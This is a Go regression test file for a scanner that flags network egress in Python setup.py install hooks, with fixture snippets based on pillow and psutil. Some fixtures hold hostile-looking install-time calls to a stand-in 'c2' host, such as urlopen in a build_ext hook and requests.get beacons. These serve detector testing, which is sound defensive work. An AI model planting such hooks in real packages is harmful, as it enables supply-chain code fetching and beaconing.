package installsurface

// D-160 regression: a network-shaped token inside a string literal that is
// DISPLAYED (print / sys.exit / warnings.warn / std-stream writes) is
// documentation shown to a human, not egress. Confirmed live on pillow 12.2.0
// (a readthedocs URL in build_ext error/help text read as url-literal
// CapNetwork — the cmdclass body was scanned raw) and psutil 7.2.2 (the
// Python-2 farewell "python2 -m pip install psutil==6.1.*" inside
// sys.exit(textwrap.dedent(...)) read as pkg-install CapNetwork — the
// whole-file inert suppression was disarmed by psutil's REAL build-toolchain
// exec sinks). Both directions are pinned: display text must not fire, and
// genuine egress — including egress deliberately placed inside or beside a
// display sink — must still be detected.

import "testing"

func cmdclassNet(src, cmd string) (found, net bool) {
	for _, h := range analyzeSetupPy(src) {
		if h.Name != "setup.py:cmdclass."+cmd {
			continue
		}
		found = true
		for _, c := range h.Caps {
			if c == CapNetwork {
				net = true
			}
		}
	}
	return found, net
}

// The psutil shape: the file has a genuine shell-exec sink (its C build), so
// the whole-file "no exec sink" suppression can never fire — the printed
// install instruction must be judged inert at its own call site.
const psutilShaped = `import subprocess, sys, textwrap

if sys.version_info[0] == 2:
    sys.exit(textwrap.dedent("""\
        As of version 6.0.0 psutil no longer supports Python 2.7.
        Latest version supporting Python 2.7 is psutil 6.1.X.
        Install it with:
            python2 -m pip install psutil==6.1.*\
        """))

def build_extension():
    subprocess.check_call(["cc", "-c", "arch.c"])

from setuptools import setup
setup(name='psutil')
`

func TestDisplayedInstallInstructionIsNotPropagatedAsNetwork(t *testing.T) {
	hooks := analyzeSetupPy(psutilShaped)
	if len(hooks) == 0 {
		t.Fatal("expected a module-level hook (the file has real exec capability)")
	}
	sawExec := false
	for _, h := range hooks {
		for _, c := range h.Caps {
			if c == CapNetwork {
				t.Errorf("hook %s: displayed pip-install farewell must NOT read as network egress: %v / %v",
					h.Name, h.Caps, h.Evidence)
			}
			if c == CapExec {
				sawExec = true
			}
		}
	}
	// The fixture must keep the property that defeats the whole-file guard:
	// a real exec sink elsewhere in the file. Without it this test would pass
	// for the wrong reason (the pre-D-160 suppression) and pin nothing.
	if !sawExec {
		t.Fatal("fixture lost its real exec sink; the test no longer exercises the per-call-site judgment")
	}
}

// The pillow shape: a cmdclass build_ext whose error/help text carries a
// documentation URL. The body previously scanned raw — no docstring, comment,
// display, or URL stripping — so the URL read as url-literal CapNetwork.
const pillowShaped = `from setuptools import setup
from setuptools.command.build_ext import build_ext

class pil_build_ext(build_ext):
    def build_extensions(self):
        msg = "The headers or library files could not be found for zlib. See https://pillow.readthedocs.io/en/latest/installation."
        raise ValueError(msg)

    def summary_report(self):
        print("To add a missing option, make sure you have the required library and headers.")
        print("See https://pillow.readthedocs.io/en/latest/installation/basic-installation.html")

setup(name='Pillow', cmdclass={'build_ext': pil_build_ext})
`

func TestCmdclassDocumentationURLIsNotNetwork(t *testing.T) {
	found, net := cmdclassNet(pillowShaped, "build_ext")
	if !found {
		t.Fatal("expected a build_ext cmdclass hook")
	}
	if net {
		t.Error("documentation URLs in build_ext error/help text must NOT read as network egress")
	}
}

func TestCmdclassPrintedShellToolIsNotNetwork(t *testing.T) {
	src := `from setuptools import setup
from setuptools.command.install import install

class post_install(install):
    def run(self):
        print("missing bootstrap: wget https://bootstrap.example/ez_setup.py then rerun")

setup(name='x', cmdclass={'install': post_install})
`
	found, net := cmdclassNet(src, "install")
	if found && net {
		t.Error("a printed wget instruction in a cmdclass body with no exec sink must NOT read as network egress")
	}
}

// Genuine egress must STILL be detected — no blind spot from the strip.
func TestDisplayContextDoesNotHideRealEgress(t *testing.T) {
	real := map[string]string{
		// A real pip install run through a shell: the command string is an
		// exec argument, not display text.
		"pip install via subprocess": "import subprocess\n" +
			"subprocess.check_call('python -m pip install numpy', shell=True)\n" +
			"from setuptools import setup\nsetup(name='x')\n",
		// Display chatter beside the real thing must not launder it.
		"print beside os.system pip install": "import os\n" +
			"print('installing helper')\n" +
			"os.system('python -m pip install left-pad')\n" +
			"from setuptools import setup\nsetup(name='x')\n",
		// An f-string can embed executable code; displaying its VALUE does not
		// make the expression that computed it inert.
		"urlopen inside an f-string inside print": "import sys\n" +
			"print(f\"status {__import__('urllib.request').urlopen('http://c2/x').read()}\")\n" +
			"from setuptools import setup\nsetup(name='x')\n",
		// Code nested in a display sink's argument list is still code; only
		// string CONTENTS are display text.
		"requests.get as sys.exit argument": "import requests, sys\n" +
			"sys.exit(requests.get('http://c2/beacon').text)\n" +
			"from setuptools import setup\nsetup(name='x')\n",
	}
	for name, src := range real {
		if !setupHasNet(src) {
			t.Errorf("genuine egress must be detected (no blind spot): %s", name)
		}
	}
}

func TestCmdclassRealEgressStillDetected(t *testing.T) {
	src := `from setuptools import setup
from setuptools.command.build_ext import build_ext

class evil_build_ext(build_ext):
    def run(self):
        from urllib.request import urlopen
        urlopen('http://c2/payload')
        print("See https://pillow.readthedocs.io/en/latest/installation.")

setup(name='x', cmdclass={'build_ext': evil_build_ext})
`
	found, net := cmdclassNet(src, "build_ext")
	if !found {
		t.Fatal("expected a build_ext cmdclass hook")
	}
	if !net {
		t.Error("a real urlopen in a cmdclass body must STILL be detected beside documentation URLs")
	}
}
